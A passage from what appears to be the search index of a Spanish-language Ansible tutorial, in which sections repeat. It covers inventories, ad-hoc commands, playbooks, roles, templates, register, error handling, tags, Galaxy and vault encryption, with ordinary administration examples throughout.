\"delta\" : \"0:00:00.003743\" , \"end\" : \"2020-11-24 18:50:34.459941\" , \"failed\" : false, \"rc\" : 0 , \"start\" : \"2020-11-24 18:50:34.456198\" , \"stderr\" : \"\" , \"stderr_lines\" : [] , \"stdout\" : \" 18:50:34 up 15 days, 10:36, 1 user, load average: 0,17, 0,46, 0,53\" , \"stdout_lines\" : [ \" 18:50:34 up 15 days, 10:36, 1 user, load average: 0,17, 0,46, 0,53\" ] } } En este ejemplo al modificar el index.html se registra la acci\u00f3n en copiado y si esta es changed se registra la salida del comando cat para mostrarla por stdout - name: instalar apache include: instalar-apache2.yml - name: Copiar fichero index.html template: src=index.html.j2 dest=/var/www/html/index.html register: copiado - name: Mostrar contenido command: cat /var/www/html/index.html register: salida when: copiado|changed - debug: var=salida.stdout when: salida|changed Ignore errors Esta opci\u00f3n sirve para que en el caso de que una tarea de error, este se ignore y siga el playbook ejecutandose con la siguiente tarea. - name: playbook para la clase register hosts: localhost tasks: - name: Visualizar hosts command: cat /etc/hosts2 ignore_errors: True Es una buena practica relacionar esta opci\u00f3 con tareas siguientes, es decir si da error haz una tarea o otra. Por ejemplo, en el siguiente playbook si no existe el fichero hosts2 se ignora el error, ademas lo registramos en una variable que con una condici\u00f3n when hace una tarea u otra. - name: playbook para la clase register hosts: localhost tasks: - name: Visualizar hosts command: cat /etc/hosts2 register: salida ignore_errors: True - name: Visualizar variable debug: var=salida.stdout_lines when: not salida is failed # salida!=failed - name: Visualizar variable debug: var=salida.stderr_lines when: salida is failed Failed when failed_when nos sirve para probocar un fallo en el caso de no cumplir la condici\u00f3n que indicamos. Por ejempo en el siguiente caso si no tenemos en localhost la interfaz eth0 el playbook registrara un fallo. - name: playbook ejemplo failed_when hosts: localhost tasks: - name: Optener interfaces de red command: ip a register: salida failed_when: \"'eth0' not in salida.stdout\" Tambi\u00e9n esta su versi\u00f3n inversa con changed_when , que en este caso daria por buena una tarea seg\u00fan la condici\u00f3n indicada. - name: playbook ejemplo failed_when hosts: localhost tasks: - name: Optener interfaces de red command: ip a register: salida failed_when: \"'inet6' not in salida.stdout\" changed_when: True Tags Los tags sirven para especificar selectivamente que tareas ejecutar o omitir. - name: Ejemplo etiqueas hosts: localhost tasks: - debug: msg=\"Tarea con tag PROD\" tags: prod - debug: msg=\"Tarea con tag DEV\" tags: dev - debug: msg=\"Tarea con varios tags\" tags: [qa, prod] - debug: msg=\"Esta tare se ejecuta siempre\" tags: always Si lanzamos el playbook sin el argumento tags se ejecutaran todas las tareas del playbook, en cambio si a\u00f1adimos el argumento tag seleccionamos cuales vejecutar. # ejecutar todas las tareas ansible-playbook etiquetas.yml # realizar tares con tag prod ansible-playbook --tags prod etiquetas.yml # omitir tareas con tag prod ansible-playbook --skip-tags prod etiquetas.yml Galaxy Ansible galaxy es un repositorio de ansible donde puedes descargar roles de otros usuarios o alojar los tuyos propios a traves de github. sintaxis: ansible-galaxy [accion] [opciones] argumentos Acciones: delete Eliminar rol dentro de la web de galaxy import Importar un rol desde github a galaxy info muestra informaci\u00f3n detallaa del rol init iniciar estructura de diretorio install Descargar rol list Listar rolers instalados login Auntentifica en la web de galaxy remove Elimina un rol del servidor local search Busqueda dentro del repositorio setup Crea una integracion con Travis CI Opciones: -f/--force sobreescribir rol -i/--ignore-errors -n/--no-deps no instalar dependencias -p/--roles-path directorio de roles -r/--roles-file ficherpo con lista de roles a instalar Busqueda Los roles de galaxy se pueden buscar desde linea de comandos o desde la web de galaxy, es recomendable la web por ser una vista mas agradable. Una vez escojido el rol deseado lo podemos instalar en nuestro servidor y lo tendremos disponible para las modificaciones necesarias. # buscar rol \u279c ansible-galaxy search \"Nginx\" # inspeccionar e instalar \u279c ansible-galaxy info nginxinc.nginx \u279c ansible-galaxy install nginxinc.nginx - downloading role 'nginx' , owned by nginxinc - downloading role from https://github.com/nginxinc/ansible-role-nginx/archive/0.18.1.tar.gz - extracting nginxinc.nginx to /home/debian/.ansible/roles/nginxinc.nginx - nginxinc.nginx ( 0 .18.1 ) was installed successfully # los roles instalados se alojan en: \u279c ls ~/.ansible/roles nginxinc.nginx \u279c ls ~/.ansible/roles/nginxinc.nginx CHANGELOG.md CODE_OF_CONDUCT.md CONTRIBUTING.md defaults files handlers LICENSE meta molecule README.md tasks templates vars Nuevo rol Galaxy permite crear una estructura de rol automaticamente para crear nuestros roles. Recordar a\u00f1adir en meta: autor, descripcion y modificar el readme \u279c playbooks ansible-galaxy init pruebarol - pruebarol was created successfully \u279c playbooks tree pruebarol pruebarol \u251c\u2500\u2500 defaults \u2502 \u2514\u2500\u2500 main.yml \u251c\u2500\u2500 files \u251c\u2500\u2500 handlers \u2502 \u2514\u2500\u2500 main.yml \u251c\u2500\u2500 meta \u2502 \u2514\u2500\u2500 main.yml \u251c\u2500\u2500 README.md \u251c\u2500\u2500 tasks \u2502 \u2514\u2500\u2500 main.yml \u251c\u2500\u2500 templates \u251c\u2500\u2500 tests \u2502 \u251c\u2500\u2500 inventory \u2502 \u2514\u2500\u2500 test.yml \u2514\u2500\u2500 vars \u2514\u2500\u2500 main.yml Subir rol a galaxy Una vez el rol listo podemos subirlo a galaxy para a\u00f1adirlo al repositorio galaxy, para hacer esto primero tendremos que subirlo a github. primero subimos nuestro rol a Github # crear uevpo repo en github y subir rol git init Inicializado repositorio Git vac\u00edo en /home/debian/Documentos/ansible/playbooks/pruebarol/.git/ git add . git commit -m \"first commit\" [ master ( commit-ra\u00edz ) a8bf75f ] first commit 9 files changed, 142 insertions ( + ) ... git remote add origin git@github.com:Jorgepastorr/pruebarol.git git push -u origin master Sincronizar repo de github con galaxy, este paso se puede hacer tambi\u00e9n desde la web de galaxy. # logueamos en galaxy y subimos nuestro rol ansible-galaxy login ansible-galaxy import jorgepastorr pruebarol Ya podemos encontrar nuestro rol en el repositorio de galaxy e instalarlo donde queramos ansible-galaxy search pruebarol ansible-galaxy install jorgepastorr.pruebarol - downloading role 'pruebarol' , owned by jorgepastorr - downloading role from https://github.com/Jorgepastorr/pruebarol/archive/master.tar.gz - extracting jorgepastorr.pruebarol to /home/debian/.ansible/roles/jorgepastorr.pruebarol - jorgepastorr.pruebarol ( master ) was installed successfully ansible-galaxy list - jorgepastorr.pruebarol, master - nginxinc.nginx, 0 .18.1 ansible-galaxy delete jorgepastorr pruebarol Vault El comando ansible-vault permite cifrar ficheros con una contrase\u00f1a para proteger datos sensibles. ansible-vault create fichero.yml # crear fichero encriptado ansible-vault edit fichero.yml # editar fichero encriptado ansible-vault encrypt fichero.yml # encriptar un fichero ansible-vault decrypt fichero.yml # desencriptar fichero ansible-vault view fichero.yml # ver fichero encriptado # preguntar contrase\u00f1a de fichero ansible-playbook --ask-vault-pass playbook.yml # coge contrase\u00f1a de fichero ansible-playbook --vault-password-file = file playbook.yml # crear archivo encryptado \u279c ansible-vault create secreto.yml New Vault password: Confirm New Vault password: \u279c cat secreto.yml $ANSIBLE_VAULT ; 1 .1 ; AES256 65613139323466646538383064626463393435656134353662613730333764313339633237313935 3363653534306566373430386631333432633566393963650a333839633137396632383865373962 37653161366234386463313362623939313062643432626530616438343664303631343861333063 3838356238306265360a323631613637313762663732636339323961366639333633393565373062 30383061643634336266376633383334666363383739363562653133386663656131 # crear archivo normal y luego encryptarlo \u279c vim secreto2.yml \u279c cat secreto2.yml clave: miSecreto \u279c ansible-vault encrypt secreto2.yml New Vault password: Confirm New Vault password: Encryption successful \u279c cat secreto2.yml $ANSIBLE_VAULT ; 1 .1 ; AES256 30306137646336316235336264396364346666343364613363353961653632343536646561663332 3935396661623165663764663738386338353263393137310a643330326331333533323961326231 64333938313130613335633064346639313465666136356132313132353663313136643730306562 6238663564646264350a336566373939316231646333386661626531373962373234363361643637 37633861376132393265363566663236656337623864656666373133393562613631 # desencriptar archivo \u279c ansible-vault decrypt secreto2.yml Vault password: Decryption successful \u279c cat secreto2.yml clave: miSecreto bien, ahora creo un playbpook muy simple donde la variable clave es data sensible. yml - name: Prueba Vault hosts: localhost tasks: - debug: var=clave ```bash esta es una simple prueba del playbook ansible-playbook -e \"clave=prueba\" vault.yml ... TASK [debug] * * * ok: [localhost] => { \"clave\": \"prueba\" } ... a\u00f1ado la variable en el archivo encriptado y me pregunta clave para desencriptar ansible-playbook -e \"@secreto.yml\" --ask-vault-pass vault.yml Vault password: ... TASK [debug] * * * ok: [localhost] => { \"clave\": \"superSecreto\" } ... a\u00f1ado la variable en el archivo encriptado y coje la clave para desencriptar del archivo .pass \u279c ansible vim .pass \u279c ansible ansible-playbook -e \"@secreto.yml\" --vault-password-file=.pass playbooks/vault.yml ... TASK [debug] * * * ok: [localhost] => { \"clave\": \"superSecreto\" } ... ```","title":"Ansible"},{"location":"sistemas/automatizacion/ansible/#ansible","text":"https://docs.ansible.com/ansible/latest/modules/modules_by_category.html","title":"Ansible"},{"location":"sistemas/automatizacion/ansible/#intalacion","text":"sudo apt install ansible ansible --version","title":"Intalaci\u00f3n"},{"location":"sistemas/automatizacion/ansible/#configuracion","text":"configurar ssh hacia todos los nodos ssh-copy-id -i user@host Por defecto ansible utiliza python2, si en los host no esta instalado se reproducira un fallo que no encuentra /usr/lib/python se resuelve crando un link en todos los hosts remotos. ln -s /usr/lib/python3 /usr/lib/python","title":"Configuraci\u00f3n"},{"location":"sistemas/automatizacion/ansible/#windows","text":"https://docs.ansible.com/ansible/latest/user_guide/windows_setup.html Para poder controlar remotamente nodos windows con ansible es necesario tener los siguientes modulos de python en el servidor python3-winrm o pywinrm y en el nodo remoto tener powershell 3.0 o superior y habilitiar control remoto con puerto 5986. Una vez habilitada la conexi\u00f3n se tendra que crear un certificado para la conexi\u00f3n o ignorar mediante la siguiente valiable, pasada desde ad-hoc o desde variable de configuraci\u00f3n ansible_winrm_server_cert_validation=ignore","title":"windows"},{"location":"sistemas/automatizacion/ansible/#inventory","text":"https://docs.ansible.com/ansible/2.3/intro_inventory.html El inventorio es donde se definen los servidores a controlar, estos servidores se pueden agrupar por grupos y especificar argumentos a cada uno de ellos. Inventori /etc/ansible/hosts #green.example.com #blue.example.com #192.168.100.1 #192.168.100.10 # GRUPO de servers -------------------------------- #[dbservers] # #db01.intranet.mydomain.net #db02.intranet.mydomain.net #10.25.1.56 #10.25.1.57 # Here's another example of host ranges, this time there are no # leading 0s: #db-[99:101]-node.example.com localhost ansible_connection = local [ vhosts ] 192 .168.122.200 ansible_user = root # ALIAS ----------------------------------- # Alias a un server # vhost1 ansible_host=192.168.122.200 ansible_user=root # VARIABLES -------------------------------- # Variables a un grupo de servidores [ vhosts:vars ] ansible_python_interpreter = /usr/bin/python3 # SUBGRUPOS ----------------------------------- [ debian ] 192 .168.122.20 [ ubuntu ] 192 .168.122.21 [ apt:children ] ubuntu debian Se pueden separar las variables en ficheros externos al inventario, estos ficheros se escribe en formato yaml . /etc/ansible/group_vars/grupo /etc/ansible/host_vars/servidor /etc/ansible/group_vars/apt ansible_become: True /etc/ansible/host_vars/pc10 ansible_python_interpreter: /usr/bin/python3","title":"Inventory"},{"location":"sistemas/automatizacion/ansible/#modulos","text":"Ansible trabaja con modulos y realizan las tareas que requrimos, tiene una lista muy extensa de m\u00f3dulos donde podemos encrnttrarlos organizados por: cloud, command,clustering, crypto, database, files, monitoring, ... Lista completa aqu\u00ed","title":"Modulos"},{"location":"sistemas/automatizacion/ansible/#ad-hoc","text":"sintaxis. ansible [opciones] servidores,grupos,all [-m modulo] [-a argumentos] si no se especifica ning\u00fan m\u00f3dulo por defecto utiliza el m\u00f3dulo command Argumentos pas utilizados en ansible: -C # comprobar si puede ser realizada una tarea -u, --user # especificar usuario -i --inventory # especificar inventario -b --become # utilizar sudo -f --fork # numero de nodos controlados simultaniamente (default 5) -k # introducir password --list-hosts # listar gosts, grupos del inventario -m # modulo -a # argumentos Ejemplos: # listartodos los hosts del inventario \u279c ansible ansible -i hosts all --list-hosts hosts ( 2 ) : localhost node # ejecutar un comando directo \u279c ~ ansible localhost -a \"hostname\" localhost | CHANGED | rc = 0 >> pc02 # utilizar modulo ping \u279c ~ ansible 192 .168.122.200 -m ping 192 .168.122.200 | SUCCESS = > { \"changed\" : false, \"ping\" : \"pong\" } # usuario especifico \u279c ~ ansible vhosts -u root -m ping 192 .168.122.200 | SUCCESS = > { \"changed\" : false, \"ping\" : \"pong\" } # filtrar un nodo y comprobar conexi\u00f3n con usario root \u279c ansible ansible --limit node -i hosts all -m ping -u root node | SUCCESS = > { \"changed\" : false, \"ping\" : \"pong\" } # instalaciones # modulo dnf, argumentos intalar vim \u279c ~ ansible 192 .168.122.200 -u root -m dnf -a 'name=vim state=present' 192 .168.122.200 | SUCCESS = > { \"changed\" : false, \"msg\" : \"Nothing to do\" , \"rc\" : 0 , \"results\" : [ \"Installed: vim\" ] } # -K preguntar por contrase\u00f1a # --become utilizar sudo \u279c ~ ansible 192 .168.122.200 -m dnf -a 'name=vim state=present' -b -K SUDO password: 192 .168.122.200 | SUCCESS = > { \"changed\" : false, \"msg\" : \"Nothing to do\" , \"rc\" : 0 , \"results\" : [ \"Installed: vim\" ] } # inventorio especifico -i --inventory \u279c ~ ansible 192 .168.122.200 --inventory my-inventory -m ping 192 .168.122.200 | SUCCESS = > { \"changed\" : false, \"ping\" : \"pong\" }","title":"ad-hoc"},{"location":"sistemas/automatizacion/ansible/#playbook","text":"Playbook es una lista de tareas a realizar en uno o mas nodos remotos, a continuaci\u00f3n se muestra dos ejemplos simples. \u279c ansible cat playbooks/copiarHost.yml --- - name : copiar archivo /etc/hosts hosts : all remote_user : jorge tasks : - name : Copiar /etc/hosts become : true copy : src=/etc/hosts dest=/etc/hosts \u279c ansible cat playbook.yml --- - name : instalar vim hosts : vhosts tasks : - name : instalando vim dnf : name : vim state : present become : true - name : saludar shell : echo \"Hola Mundo\" Para ejecutar un playbook se utiliza la sintaxis ansible-playbook [opciones] playbook.yml \u279c ansible-playbook playbook.yml -K SUDO password: PLAY [ vhosts ] ******************************************************************************************* TASK [ Gathering Facts ] ********************************************************************************** ok: [ 192 .168.122.200 ] TASK [ instalar vim ] ************************************************************************************* ok: [ 192 .168.122.200 ] TASK [ saludar ] ****************************************************************************************** changed: [ 192 .168.122.200 ] PLAY RECAP ********************************************************************************************** 192 .168.122.200 : ok = 3 changed = 1 unreachable = 0 failed = 0 Opciones \u00fatiles para playbooks, tambi\u00e9n se pueden utilizar las opciones de ad-hoc: -i # inventario --syntax-check # verificar sintaxis de playbook --list-task # listar tareas del playbook --step # preguntar en cada tarea si ejecutarla --start-at-task = nombre de la tarea # empezar desde una tarea especifica --forks = / -f # numero de conexiones simultaneas, por defecto 5","title":"Playbook"},{"location":"sistemas/automatizacion/ansible/#parametros-basicos","text":"Con hosts especificamos que grupos o servidores ejecutaran la siguientes tareas, el separador es : y es posible utilizar los simbolos & y ! para ambos o negaci\u00f3n. hosts: serverweb # grupo serverweb hosts: serverweb:dbweb # grupo serverweb y dbweb hosts: serverweb:&madrid # nodos que pertenezcan a serverweb y madrid hosts: serverweb:!madrid # nodos del serverweb que no pertenezcan a madrid remote_user: jorge become: true/false ( 1/0 ) # utilizar sudo o no become_user: (usuario) postgres # cambiar de usuario become_method: sudo/su # metodo de cambio check_mode: true/false # mode de prueba","title":"Parametros b\u00e1sicos"},{"location":"sistemas/automatizacion/ansible/#variables","text":"# plantilla donde se mostraran variables \u279c ansible cat plantillas/host.j2 {{ miip }} {{ ansible_hostname }} {{ ansible_fqdn }} # playbook donde se especifica una variable y se asigna a una plantilla \u279c ansible cat playbooks/variables.yml --- - name: crear fichero usando variables hosts: localhost connection: local vars: - miip: \"1.2.3.4\" tasks: - name: crear fichero hosts template: src = host.j2 dest = /tmp/hosts # ejeuci\u00f3n \u279c ansible-playbook -i hosts playbooks/variables.yml ... # de la plantilla se a generado este archivo \u279c ansible cat /tmp/hosts 1 .2.3.4 pc02 pc02 # las variables predefinidas de ansible se pueden ver con el modulo setup \u279c ansible localhost -m setup Prioridades de variables definidas de menor prioridad a mayor prioridad. defaults definidas en un rol variables de grupo ( inventario, group_vars/all, group_vars/grupo ) variables de servidor ( inventario, host_vars/servidor ) \"Facts\" del servidor variabes de playbook ( vars_prompt, vars_files ) variable de rol definidas en /roles/rol/vars/main.yml variables de bloque, definidas en tareas parametros de rol, include_params, include_vars set_facts/ registered_vars extra vars, definidas al lanzar la orden de ansible ( siempre gana )","title":"Variables"},{"location":"sistemas/automatizacion/ansible/#handlers","text":"handlers son tareas que se ejecutan si un trabajo a ido bien y solicita dicha tarea, es decir si se instala nginx reinicia el servicio, si ya esta intalado no se ejecutara el handler. \u279c ansible cat handlers.yml --- - hosts : vhosts become : true tasks : - name : instalar nginx dnf : name : nginx state : present update_cache : true notify : - \"Reiniciar nginx\" handlers : - name : Reiniciar nginx service : name : nginx state : restarted \u279c ansible ansible-playbook handlers.yml -K SUDO password: PLAY [ vhosts ] ******************************************************************************************* TASK [ Gathering Facts ] ********************************************************************************** ok: [ 192 .168.122.200 ] TASK [ instalar nginx ] *********************************************************************************** changed: [ 192 .168.122.200 ] RUNNING HANDLER [ Reiniciar nginx ] *********************************************************************** changed: [ 192 .168.122.200 ] PLAY RECAP ********************************************************************************************** 192 .168.122.200 : ok = 3 changed = 2 unreachable = 0 failed = 0","title":"Handlers"},{"location":"sistemas/automatizacion/ansible/#include-y-role","text":"Estos son metodos para desglosar un playbook que es demasiado grande para ser leeible y facilitar la tarea de modificaciones etc.. Include es simplemente el incluir un playbook dentro de otro. Role es una estructura de directorios donde se ordenaran adecuadamente los diferentes archivos yaml para las tareas. site.yml webservers.yml fooservers.yml roles/ common/ tasks/ handlers/ files/ templates/ vars/ defaults/ meta/ webservers/ tasks/ defaults/ meta/ tasks - contiene la lista principal de tareas que debe ejecutar el rol. handlers - contiene handlers, que pueden ser utilizados por este rol o incluso en cualquier lugar fuera de este rol. defaults - variables predeterminadas para el rol (consulta Using Variables para mas informaci\u00f3n). vars - otras variables para el rol (see Using Variables for more information). files - contiene archivos que se pueden implementar a trav\u00e9s de este rol. templates - contiene plantillas que se pueden implementar a trav\u00e9s de este rol. meta - define algunos metadatos para este rol.","title":"Include y Role"},{"location":"sistemas/automatizacion/ansible/#include","text":"En el siguiente ejemplo es una instalaci\u00f3n simple de el editor vim y un servicio nginx, con el metodo include separando los pasos de nginx en un archivo yaml diferente. --- - name: primer Play hosts: vhosts remote_user: jorge become: true tasks: - name: instalar nginx dnf: name: vim state: present - include: instalar_nginx.yml instalar_nginx.yml --- - name: instalar nginx dnf: name=nginx state=latest - name: instalar servicio service: name=nginx state=started - name: habilitar servicio service: name=nginx enabled=true","title":"Include"},{"location":"sistemas/automatizacion/ansible/#role","text":"En este ejemplo se muestra una instalaci\u00f3n simple con la estructura de un role \u279c web tree \u251c\u2500\u2500 instalar_con_rol.yml \u2514\u2500\u2500 roles \u2514\u2500\u2500 apache2 \u251c\u2500\u2500 files \u2502 \u2514\u2500\u2500 apache2.conf \u251c\u2500\u2500 handlers \u2502 \u2514\u2500\u2500 main.yml \u251c\u2500\u2500 tasks \u2502 \u2514\u2500\u2500 main.yml \u2514\u2500\u2500 templates \u2514\u2500\u2500 index.html.j2 instalar_con_rol.yml - name: instalar y configurar apache2 hosts: vhosts remote_user: jorge become: true roles: - apache2 roles/apache2/tasks/main.yml - name: instalar apache2 apt: name=apache2 state=latest - name: Iniciar y habilitar servicio service: name=apache2 state=started enabled=true - name: Copiar fichero de configuracion copy: src=apache2.conf dest=/etc/apache2/apache2.conf notify: restart_httpd - name: Copiar fichero index.html template: src=index.html.j2 dest=/var/www/html/index.html roles/apache2/handlers/main.yml - name: restart_httpd service: name=apache2 state=restarted roles/apache2/templates/index.html.j2 Hola al servidor {{ ansible_fqdn }}","title":"Role"},{"location":"sistemas/automatizacion/ansible/#templates","text":"dentro de una plantilla se pueden especificar las siguientes instrucciones: Expresiones: una {{ variable }} propia o del sistema como {{ ansible_fqdn }} Control: c\u00f3digo con {% ... %} comentarios: {# ... #} {% if ansible_distribution == \"Debian\" %} Muestra s\u00f3lo en sistemas Debian {% endif %} {% for usuario in lista_usuarios %} {{ usuario }} {% endfor %}","title":"Templates"},{"location":"sistemas/automatizacion/ansible/#condiciones","text":"Las condiciones son para ejecutar tareas si dicha condici\u00f3n es cierta, en los siguientes ejemplos se ejecutaran las tareas si las distribuciones remotas son Debian o Ubuntu, esta informaci\u00f3n de las variables de ansible que podemos consultar en ansible hostname -m setup . # condicion para tarea - name: instalar apache2 include: instalar_apache2.yml when: ansible_distribution == \"Debian\" or ansible_distribution == \"Ubuntu\" # condicion para rol - name: instalar y configurar apache2 hosts: vhosts remote_user: jorge become: true roles: - { role: apache2, when: ansible_distribution == \"Debian\" or ansible_distribution == \"Ubuntu\" }","title":"Condiciones"},{"location":"sistemas/automatizacion/ansible/#bucles","text":"los bucles evitan repetir c\u00f3digo y asi reducir el tama\u00f1o del playbook por ejemplo en la instalaci\u00f3n de diversos paquetes. # bucle de tres paquetes a instalar - name: Instalar paquetes apt: name={{ item }} state=latest with_items: - mysql-server - phpmyadmin - php5 # bucle de diccionario creando usuarios - name: Crear usuarios necesarios user: name={{ item.nombre }} groups={{ item.grupo }} with_items: - { nombre: usuario1, grupo: www-data } - { nombre: usuario2, grupo: www-data } # bucle utilizando una variable que es una lista externa - name: Instalar paquetes apt: name={{ item }} state=latest with_items: \"{{ lista_paquetes }}\" defaults/main.yml lista_paquetes: [\"php5\", \"phpmyadmin\", \"mysql-server\"]","title":"bucles"},{"location":"sistemas/automatizacion/ansible/#register","text":"El register permite guardar en una variable el resultado de una acci\u00f3n generada por un modulo de una tarea. - name: playbook para la clase register hosts: localhost tasks: - name: Ejecutar comando uptime command: uptime register: salida_uptime - name: Visualizar variable debug: var=salida_uptime Los valores de retorno son: changed, failed, skipped, rc rc (retorn command) efecto de salida stdout, stderr, stdout_lines, stderr_lines ejemplo: register: salida_uptime.stdout ... TASK [ Visualizar variable ] ****************************************************************************** ok: [ localhost ] = > { \"salida_uptime\" : { \"changed\" : true, \"cmd\" : [ \"uptime\" ] , \"delta\" : \"0:00:00.003743\" , \"end\" : \"2020-11-24 18:50:34.459941\" , \"failed\" : false, \"rc\" : 0 , \"start\" : \"2020-11-24 18:50:34.456198\" , \"stderr\" : \"\" , \"stderr_lines\" : [] , \"stdout\" : \" 18:50:34 up 15 days, 10:36, 1 user, load average: 0,17, 0,46, 0,53\" , \"stdout_lines\" : [ \" 18:50:34 up 15 days, 10:36, 1 user, load average: 0,17, 0,46, 0,53\" ] } } En este ejemplo al modificar el index.html se registra la acci\u00f3n en copiado y si esta es changed se registra la salida del comando cat para mostrarla por stdout - name: instalar apache include: instalar-apache2.yml - name: Copiar fichero index.html template: src=index.html.j2 dest=/var/www/html/index.html register: copiado - name: Mostrar contenido command: cat /var/www/html/index.html register: salida when: copiado|changed - debug: var=salida.stdout when: salida|changed","title":"Register"},{"location":"sistemas/automatizacion/ansible/#ignore-errors","text":"Esta opci\u00f3n sirve para que en el caso de que una tarea de error, este se ignore y siga el playbook ejecutandose con la siguiente tarea. - name: playbook para la clase register hosts: localhost tasks: - name: Visualizar hosts command: cat /etc/hosts2 ignore_errors: True Es una buena practica relacionar esta opci\u00f3 con tareas siguientes, es decir si da error haz una tarea o otra. Por ejemplo, en el siguiente playbook si no existe el fichero hosts2 se ignora el error, ademas lo registramos en una variable que con una condici\u00f3n when hace una tarea u otra. - name: playbook para la clase register hosts: localhost tasks: - name: Visualizar hosts command: cat /etc/hosts2 register: salida ignore_errors: True - name: Visualizar variable debug: var=salida.stdout_lines when: not salida is failed # salida!=failed - name: Visualizar variable debug: var=salida.stderr_lines when: salida is failed","title":"Ignore errors"},{"location":"sistemas/automatizacion/ansible/#failed-when","text":"failed_when nos sirve para probocar un fallo en el caso de no cumplir la condici\u00f3n que indicamos. Por ejempo en el siguiente caso si no tenemos en localhost la interfaz eth0 el playbook registrara un fallo. - name: playbook ejemplo failed_when hosts: localhost tasks: - name: Optener interfaces de red command: ip a register: salida failed_when: \"'eth0' not in salida.stdout\" Tambi\u00e9n esta su versi\u00f3n inversa con changed_when , que en este caso daria por buena una tarea seg\u00fan la condici\u00f3n indicada. - name: playbook ejemplo failed_when hosts: localhost tasks: - name: Optener interfaces de red command: ip a register: salida failed_when: \"'inet6' not in salida.stdout\" changed_when: True","title":"Failed when"},{"location":"sistemas/automatizacion/ansible/#tags","text":"Los tags sirven para especificar selectivamente que tareas ejecutar o omitir. - name: Ejemplo etiqueas hosts: localhost tasks: - debug: msg=\"Tarea con tag PROD\" tags: prod - debug: msg=\"Tarea con tag DEV\" tags: dev - debug: msg=\"Tarea con varios tags\" tags: [qa, prod] - debug: msg=\"Esta tare se ejecuta siempre\" tags: always Si lanzamos el playbook sin el argumento tags se ejecutaran todas las tareas del playbook, en cambio si a\u00f1adimos el argumento tag seleccionamos cuales vejecutar. # ejecutar todas las tareas ansible-playbook etiquetas.yml # realizar tares con tag prod ansible-playbook --tags prod etiquetas.yml # omitir tareas con tag prod ansible-playbook --skip-tags prod etiquetas.yml","title":"Tags"},{"location":"sistemas/automatizacion/ansible/#_1","text":"","title":""},{"location":"sistemas/automatizacion/ansible/#galaxy","text":"Ansible galaxy es un repositorio de ansible donde puedes descargar roles de otros usuarios o alojar los tuyos propios a traves de github. sintaxis: ansible-galaxy [accion] [opciones] argumentos Acciones: delete Eliminar rol dentro de la web de galaxy import Importar un rol desde github a galaxy info muestra informaci\u00f3n detallaa del rol init iniciar estructura de diretorio install Descargar rol list Listar rolers instalados login Auntentifica en la web de galaxy remove Elimina un rol del servidor local search Busqueda dentro del repositorio setup Crea una integracion con Travis CI Opciones: -f/--force sobreescribir rol -i/--ignore-errors -n/--no-deps no instalar dependencias -p/--roles-path directorio de roles -r/--roles-file ficherpo con lista de roles a instalar","title":"Galaxy"},{"location":"sistemas/automatizacion/ansible/#busqueda","text":"Los roles de galaxy se pueden buscar desde linea de comandos o desde la web de galaxy, es recomendable la web por ser una vista mas agradable. Una vez escojido el rol deseado lo podemos instalar en nuestro servidor y lo tendremos disponible para las modificaciones necesarias. # buscar rol \u279c ansible-galaxy search \"Nginx\" # inspeccionar e instalar \u279c ansible-galaxy info nginxinc.nginx \u279c ansible-galaxy install nginxinc.nginx - downloading role 'nginx' , owned by nginxinc - downloading role from https://github.com/nginxinc/ansible-role-nginx/archive/0.18.1.tar.gz - extracting nginxinc.nginx to /home/debian/.ansible/roles/nginxinc.nginx - nginxinc.nginx ( 0 .18.1 ) was installed successfully # los roles instalados se alojan en: \u279c ls ~/.ansible/roles nginxinc.nginx \u279c ls ~/.ansible/roles/nginxinc.nginx CHANGELOG.md CODE_OF_CONDUCT.md CONTRIBUTING.md defaults files handlers LICENSE meta molecule README.md tasks templates vars","title":"Busqueda"},{"location":"sistemas/automatizacion/ansible/#nuevo-rol","text":"Galaxy permite crear una estructura de rol automaticamente para crear nuestros roles. Recordar a\u00f1adir en meta: autor, descripcion y modificar el readme \u279c playbooks ansible-galaxy init pruebarol - pruebarol was created successfully \u279c playbooks tree pruebarol pruebarol \u251c\u2500\u2500 defaults \u2502 \u2514\u2500\u2500 main.yml \u251c\u2500\u2500 files \u251c\u2500\u2500 handlers \u2502 \u2514\u2500\u2500 main.yml \u251c\u2500\u2500 meta \u2502 \u2514\u2500\u2500 main.yml \u251c\u2500\u2500 README.md \u251c\u2500\u2500 tasks \u2502 \u2514\u2500\u2500 main.yml \u251c\u2500\u2500 templates \u251c\u2500\u2500 tests \u2502 \u251c\u2500\u2500 inventory \u2502 \u2514\u2500\u2500 test.yml \u2514\u2500\u2500 vars \u2514\u2500\u2500 main.yml","title":"Nuevo rol"},{"location":"sistemas/automatizacion/ansible/#subir-rol-a-galaxy","text":"Una vez el rol listo podemos subirlo a galaxy para a\u00f1adirlo al repositorio galaxy, para hacer esto primero tendremos que subirlo a github. primero subimos nuestro rol a Github # crear uevpo repo en github y subir rol git init Inicializado repositorio Git vac\u00edo en /home/debian/Documentos/ansible/playbooks/pruebarol/.git/ git add . git commit -m \"first commit\" [ master ( commit-ra\u00edz ) a8bf75f ] first commit 9 files changed, 142 insertions ( + ) ... git remote add origin git@github.com:Jorgepastorr/pruebarol.git git push -u origin master Sincronizar repo de github con galaxy, este paso se puede hacer tambi\u00e9n desde la web de galaxy. # logueamos en galaxy y subimos nuestro rol ansible-galaxy login ansible-galaxy import jorgepastorr pruebarol Ya podemos encontrar nuestro rol en el repositorio de galaxy e instalarlo donde queramos ansible-galaxy search pruebarol ansible-galaxy install jorgepastorr.pruebarol - downloading role 'pruebarol' , owned by jorgepastorr - downloading role from https://github.com/Jorgepastorr/pruebarol/archive/master.tar.gz - extracting jorgepastorr.pruebarol to /home/debian/.ansible/roles/jorgepastorr.pruebarol - jorgepastorr.pruebarol ( master ) was installed successfully ansible-galaxy list - jorgepastorr.pruebarol, master - nginxinc.nginx, 0 .18.1 ansible-galaxy delete jorgepastorr pruebarol","title":"Subir rol a galaxy"},{"location":"sistemas/automatizacion/ansible/#vault","text":"El comando ansible-vault permite cifrar ficheros con una contrase\u00f1a para proteger datos sensibles. ansible-vault create fichero.yml # crear fichero encriptado ansible-vault edit fichero.yml # editar fichero encriptado ansible-vault encrypt fichero.yml # encriptar un fichero ansible-vault decrypt fichero.yml # desencriptar fichero ansible-vault view fichero.yml # ver fichero encriptado # preguntar contrase\u00f1a de fichero ansible-playbook --ask-vault-pass playbook.yml # coge contrase\u00f1a de fichero ansible-playbook --vault-password-file = file playbook.yml # crear archivo encryptado \u279c ansible-vault create secreto.yml New Vault password: Confirm New Vault password: \u279c cat secreto.yml $ANSIBLE_VAULT ; 1 .1 ; AES256 65613139323466646538383064626463393435656134353662613730333764313339633237313935 3363653534306566373430386631333432633566393963650a333839633137396632383865373962 